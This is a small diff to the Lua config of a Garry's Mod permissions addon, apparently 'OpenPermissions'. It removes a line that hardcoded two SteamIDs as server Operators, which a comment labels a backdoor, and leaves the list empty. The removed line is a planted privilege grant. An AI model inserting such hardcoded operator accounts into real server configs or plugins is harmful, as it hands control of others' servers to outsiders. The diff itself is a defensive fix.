@@ -19,7 +19,8 @@
 OpenPermissions.Operators.Usergroups = {"superadmin"}
 
 -- Enter SteamIDs or SteamID64s of people who should be Operators
-OpenPermissions.Operators.SteamIDs = {"STEAM_0:0:110539379", "76561198181344486"}
+-- REMOVED: Hardcoded backdoor SteamIDs
+OpenPermissions.Operators.SteamIDs = {}
 
 -- Don't delete the line below; your config will break.
 return true
